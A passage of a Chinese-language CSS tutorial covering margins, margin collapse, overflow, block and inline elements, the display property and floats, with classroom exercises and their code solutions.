class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line"><span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">598px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">98px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> black solid;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">100px</span> auto;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;div class="box"&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><p></p><p>2、制作下面的菜单效果：<br><img src="/qianduan_images/006.jpg" alt="课堂练习示例图片"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line"><span class="attribute">margin</span>: <span class="number">0</span>; <span class="comment">/* body标签本身带有8像素的间隔，需要去掉这个盒子才能贴边 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">150px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">50px</span> auto <span class="number">0</span>; <span class="comment">/* 设置auto表示水平居中 */</span></span><br><span class="line">    <span class="attribute">background-color</span>: gold;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box</span> <span class="selector-tag">div</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">30px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> green solid;</span><br><span class="line">    <span class="attribute">background-color</span>: gold;</span><br><span class="line">    <span class="attribute">margin-top</span>: -<span class="number">1px</span>; <span class="comment">/* 设置负值表示边框重叠 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;div class="box"&gt;</span><br><span class="line">    &lt;div class="box1"&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class="box2"&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class="box3"&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class="box4"&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class="box5"&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><h3 id="3-7-2-外边距合并"><a href="#3-7-2-外边距合并" class="headerlink" title="3.7.2 外边距合并"></a>3.7.2 <strong>外边距合并</strong></h3><p>外边距合并指的是，当两个垂直外边距相遇时，它们将形成一个外边距。合并后的外边距的高度等于两个发生合并的外边距的高度中的较大者。解决方法如下：</p><p>1、使用这种特性<br>2、设置一边的外边距，一般设置margin-top<br>3、将元素浮动或者定位</p><p><strong>理解练习</strong><br>使用div标签制作如下布局:<br><img src="/qianduan_images/007.jpg" alt="课堂练习示例图片"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">500px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid black;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">50px</span> auto <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box</span> <span class="selector-tag">div</span> &#123;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">margin-right</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">20px</span>; <span class="comment">/* 中间的间隔应该是40px,但是因为是合并，实际是20px*/</span></span><br><span class="line">    <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 或者使用如下的这个汇总形式</span></span><br><span class="line"><span class="comment">.box div &#123;</span></span><br><span class="line"><span class="comment">    margin: 20px;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">&lt;div class="box"&gt;</span><br><span class="line">    &lt;<span class="selector-tag">div</span>&gt;</span><br><span class="line">        外边距合并指的是，当两个垂直外边距相遇时，它们将形成一个外边距。合并后的外边距的高度等于两个发生合并的外边距的高度中的较大者。</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;<span class="selector-tag">div</span>&gt;</span><br><span class="line">        外边距合并指的是，当两个垂直外边距相遇时，它们将形成一个外边距。合并后的外边距的高度等于两个发生合并的外边距的高度中的较大者。</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;<span class="selector-tag">div</span>&gt;</span><br><span class="line">        外边距合并指的是，当两个垂直外边距相遇时，它们将形成一个外边距。合并后的外边距的高度等于两个发生合并的外边距的高度中的较大者。</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;<span class="selector-tag">div</span>&gt;</span><br><span class="line">        外边距合并指的是，当两个垂直外边距相遇时，它们将形成一个外边距。合并后的外边距的高度等于两个发生合并的外边距的高度中的较大者。</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><h3 id="3-7-3-margin-top-塌陷"><a href="#3-7-3-margin-top-塌陷" class="headerlink" title="3.7.3 margin-top 塌陷"></a>3.7.3 <strong>margin-top 塌陷</strong></h3><p>在两个盒子嵌套时候，内部的盒子设置的margin-top会加到外边的盒子上，导致内部的盒子margin-top设置失败，解决方法如下：</p><p>1、外部盒子设置一个边框<br>2、外部盒子设置 overflow:hidden<br>3、使用伪元素类：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">:before</span>&#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">''</span>;</span><br><span class="line">    <span class="attribute">display</span>:table;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>理解练习</strong><br>分别使用margin间距和padding间距制作下面的例子： <img src="/qianduan_images/008.jpg" alt="课堂练习示例图片"></p><p>第一个图<br></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: gold;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid black;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box1</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">120px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: green;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">75px</span> auto <span class="number">40px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;div class="box"&gt;</span><br><span class="line">    &lt;div class="box1"&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p></p><p>第二个图<br></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: gold;</span><br><span class="line">    <span class="comment">/*border: 1px solid black;  第一种解决塌陷的方法：给外部盒子加个边框 */</span></span><br><span class="line">    <span class="comment">/*overflow: hidden; 第二种解决塌陷的方法：处理css外部溢出 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box1</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">120px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: green;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">75px</span> auto <span class="number">40px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box</span><span class="selector-pseudo">:before</span>&#123; <span class="comment">/* 第三种解决塌陷的方法：使用伪元素类，推荐使用这个*/</span></span><br><span class="line">    <span class="attribute">content</span>: <span class="string">''</span>;</span><br><span class="line">    <span class="attribute">display</span>:table;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;div class="box"&gt;</span><br><span class="line">    &lt;div class="box1"&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p></p><h2 id="3-8-css元素溢出"><a href="#3-8-css元素溢出" class="headerlink" title="3.8 css元素溢出"></a>3.8 css元素溢出</h2><p>当子元素的尺寸超过父元素的尺寸时，需要设置父元素显示溢出的子元素的方式，设置的方法是通过overflow属性来设置。</p><p><strong>overflow的设置项：</strong><br>1、visible 默认值。内容不会被修剪，会呈现在元素框之外。<br>2、hidden 内容会被修剪，并且其余内容是不可见的，此属性还有清除浮动、清除margin-top塌陷的功能。<br>3、scroll 内容会被修剪，但是浏览器会显示滚动条以便查看其余的内容。<br>4、auto 如果内容被修剪，则浏览器会显示滚动条以便查看其余的内容。<br>5、inherit 规定应该从父元素继承 overflow 属性的值。</p><p>元素溢出示例：<br><img src="/qianduan_images/009.jpg" alt="课堂练习示例图片"></p><h2 id="3-9-块元素、内联元素、内联块元素"><a href="#3-9-块元素、内联元素、内联块元素" class="headerlink" title="3.9 块元素、内联元素、内联块元素"></a>3.9 块元素、内联元素、内联块元素</h2><p>元素就是标签，布局中常用的有三种标签，块元素、内联元素、内联块元素，了解这三种元素的特性，才能熟练的进行页面布局。</p><h3 id="3-9-1-块元素"><a href="#3-9-1-块元素" class="headerlink" title="3.9.1 块元素"></a>3.9.1 <strong>块元素</strong></h3><p>块元素，也可以称为行元素，布局中常用的标签如：div、p、ul、li、h1~h6、dl、dt、dd等等都是块元素，它在布局中的行为：</p><ul><li>支持全部的样式</li><li>如果没有设置宽度，默认的宽度为父级宽度100%</li><li>盒子占据一行、即使设置了宽度</li></ul><h3 id="3-9-2-内联元素"><a href="#3-9-2-内联元素" class="headerlink" title="3.9.2 内联元素"></a>3.9.2 <strong>内联元素</strong></h3><p>内联元素，也可以称为行内元素，布局中常用的标签如：a、span、em、b、strong、i等等都是内联元素，它们在布局中的行为：</p><ul><li>支持部分样式（不支持宽、高、margin上下、padding上下）</li><li>宽高由内容决定</li><li>盒子并在一行</li><li>代码换行，盒子之间会产生间距</li><li>子元素是内联元素，父元素可以用text-align属性设置子元素水平对齐方式</li></ul><p><strong>解决内联元素间隙的方法</strong><br>1、去掉内联元素之间的换行<br>2、将内联元素的父级设置font-size为0，内联元素自身再设置font-size</p><h3 id="3-9-3-内联块元素"><a href="#3-9-3-内联块元素" class="headerlink" title="3.9.3 内联块元素"></a>3.9.3 <strong>内联块元素</strong></h3><p>内联块元素，也叫行内块元素，是新增的元素类型，现有元素没有归于此类别的，img和input元素的行为类似这种元素，但是也归类于内联元素，我们可以用display属性将块元素或者内联元素转化成这种元素。它们在布局中表现的行为：</p><ul><li>支持全部样式</li><li>如果没有设置宽高，宽高由内容决定</li><li>盒子并在一行</li><li>代码换行，盒子会产生间距</li><li>子元素是内联块元素，父元素可以用text-align属性设置子元素水平对齐方式。</li></ul><p>这三种元素，可以通过display属性来相互转化，不过实际开发中，块元素用得比较多，所以我们经常把内联元素转化为块元素，少量转化为内联块，而要使用内联元素时，直接使用内联元素，而不用块元素转化了。</p><h3 id="3-9-4-display属性"><a href="#3-9-4-display属性" class="headerlink" title="3.9.4 display属性"></a>3.9.4 <strong>display属性</strong></h3><p>display属性是用来设置元素的类型及隐藏的，常用的属性有：<br>1、none 元素隐藏且不占位置<br>2、block 元素以块元素显示<br>3、inline 元素以内联元素显示<br>4、inline-block 元素以内联块元素显示</p><p><strong>课堂练习</strong></p><p>请制作图中所示的菜单：<br><img src="/qianduan_images/010.jpg" alt="课堂练习示例图片"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">    <span class="selector-class">.menu</span> &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">694px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">        <span class="attribute">margin</span>: <span class="number">50px</span> auto <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">font-size</span>: <span class="number">0</span>; <span class="comment">/* 解决内联元素间隙：父级设置font-size为0，内联元素自身再设置font-size */</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.menu</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">98px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">48px</span>;</span><br><span class="line">        <span class="attribute">background-color</span>: <span class="number">#ffffff</span>; <span class="comment">/* 背景色 */</span></span><br><span class="line">        <span class="attribute">display</span>: inline-block; <span class="comment">/* 行内块 */</span></span><br><span class="line">        <span class="attribute">font-size</span>: <span class="number">16px</span>; <span class="comment">/* 字体大小 */</span></span><br><span class="line">        <span class="attribute">font-family</span>: <span class="string">"Microsoft YaHei"</span>; <span class="comment">/* 字体样式 */</span></span><br><span class="line">        <span class="attribute">color</span>: pink; <span class="comment">/* 字体颜色 */</span></span><br><span class="line">        <span class="attribute">border</span>: <span class="number">1px</span> solid gold; <span class="comment">/* 边框线 */</span></span><br><span class="line">        <span class="attribute">margin-left</span>: -<span class="number">1px</span>; <span class="comment">/* 去掉重叠的边框线 */</span></span><br><span class="line">        <span class="attribute">text-align</span>: center; <span class="comment">/* 文字水平居中 */</span></span><br><span class="line">        <span class="attribute">line-height</span>: <span class="number">48px</span>; <span class="comment">/* 文字垂直居中 */</span></span><br><span class="line">        <span class="attribute">text-decoration</span>: none; <span class="comment">/* 去掉超链接下划线 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="selector-class">.menu</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123; <span class="comment">/* 伪类 */</span></span><br><span class="line">        <span class="attribute">background-color</span>: gold;</span><br><span class="line">        <span class="attribute">color</span>: white;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class="menu"&gt;</span><br><span class="line">    &lt;a href="#"&gt;首页&lt;/a&gt;</span><br><span class="line">    &lt;a href="#"&gt;公司简介&lt;/a&gt;</span><br><span class="line">    &lt;a href="#"&gt;解决方案&lt;/a&gt;</span><br><span class="line">    &lt;a href="#"&gt;公司新闻&lt;/a&gt;</span><br><span class="line">    &lt;a href="#"&gt;行业动态&lt;/a&gt;</span><br><span class="line">    &lt;a href="#"&gt;招贤纳士&lt;/a&gt;</span><br><span class="line">    &lt;a href="#"&gt;联系我们&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p><strong>display属性扩展</strong><br><code>none</code> 元素隐藏且不占位置<br>以下示例是元素默认隐藏不显示，只有当鼠标放在元素上时才会显示出来<br></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.con</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.con</span> <span class="selector-tag">h3</span>&#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">30px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.box2</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: gold;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">16px</span>;</span><br><span class="line">    <span class="attribute">display</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.con</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.box2</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;div class="con"&gt;</span><br><span class="line">    &lt;h3&gt;文字标题&lt;/h3&gt;</span><br><span class="line">    &lt;div class="box2"&gt;文字标题的说明&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p></p><h2 id="3-10-浮动"><a href="#3-10-浮动" class="headerlink" title="3.10 浮动"></a>3.10 浮动</h2><h3 id="3-10-1-浮动特性"><a href="#3-10-1-浮动特性" class="headerlink" title="3.10.1 浮动特性"></a>3.10.1 <strong>浮动特性</strong></h3><p>1、浮动元素有左浮动(float:left)和右浮动(float:right)两种</p><p>2、浮动的元素会向左或向右浮动，碰到父元素边界、其他元素才停下来</p><p>3、相邻浮动的块元素可以并在一行，超出父级宽度就换行</p><p>4、浮动让行内元素或块元素自动转化为行内块元素(此时不会有行内块元素间隙问题)</p><p>5、浮动元素后面没有浮动的元素会占据浮动元素的位置，没有浮动的元素内的文字会避开浮动的元素，形成文字饶图的效果</p><p>6、父元素如果没有设置尺寸(一般是高度不设置)，父元素内整体浮动的元素无法撑开父元素，父元素需要清除浮动</p><p>7、浮动元素之间没有垂直margin的合并</p><p><strong>理解练习</strong><br>1、两端对齐浮动<br><img src="/qianduan_images/011.jpg" alt="课堂练习示例图片"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.con</span>&#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">400px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">80px</span>;</span><br><span class="line">        <span class="attribute">border</span>: <span class="number">1px</span> solid gold;</span><br><span class="line">        <span class="attribute">margin</span>: <span class="number">50px</span> auto <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.con</span> <span class="selector-tag">div</span>&#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">60px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">60px</span>;</span><br><span class="line">        <span class="attribute">display</span>: inline-block;</span><br><span class="line">        <span class="attribute">margin</span>: <span class="number">10px</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.box01</span>&#123;</span><br><span class="line">        <span class="attribute">background-color</span>: <span class="number">#90ee90</span>;</span><br><span class="line">        <span class="attribute">float</span>: left;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.box02</span>&#123;</span><br><span class="line">        <span class="attribute">background-color</span>: pink;</span><br><span class="line">        <span class="attribute">float</span>: right;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;!<span class="selector-tag">--div</span><span class="selector-class">.con</span>&gt;<span class="selector-tag">div</span><span class="selector-class">.box01--</span>&gt;</span><br><span class="line">&lt;div class="con"&gt;</span><br><span class="line">&lt;div class="box01"&gt;&lt;/div&gt;</span><br><span class="line">&lt;div class="box02"&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p><img src="/qianduan_images/012.jpg" alt="课堂练习示例图片"></p><p>2、请使用浮动制作图中所示的菜单：<br><img src="/qianduan_images/013.jpg" alt="课堂练习示例图片"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.menu</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">694px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">list-style</span>: none; <span class="comment">/* 去掉无序列表前面的小圆点 */</span></span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">50px</span> auto <span class="number">0</span>; <span class="comment">/* 覆盖原始的ul margin */</span></span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>; <span class="comment">/* 覆盖原始的ul padding */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.menu</span> <span class="selector-tag">li</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">98px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">48px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid gold;</span><br><span class="line">    <span class="attribute">background-color</span>: white;</span><br><span class="line">    <span class="comment">/*display: inline-block;*/</span></span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">    <span class="attribute">margin-left</span>: -<span class="number">1px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.menu</span> <span class="selector-tag">li</span> <span class="selector-tag">a</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">98px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">48px</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">48px</span>;</span><br><span class="line">    <span class="attribute">text-decoration</span>: none;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">16px</span>;</span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">"Microsoft YaHei"</span>;</span><br><span class="line">    <span class="attribute">color</span>: pink;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.menu</span> <span class="selector-tag">li</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: gold;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;ul class="menu"&gt;</span><br><span class="line">    &lt;li&gt;&lt;a href="#"&gt;公司简介&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;a href="#"&gt;公司简介&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;a href="#"&gt;公司简介&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;a href="#"&gt;公司简介&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;a href="#"&gt;公司简介&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;a href="#"&gt;公司简介&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;a href="#"&gt;公司简介&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure><p>3、文字饶图效果:<br><img src="/qianduan_images/014.jpg" alt="课堂练习示例图片"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 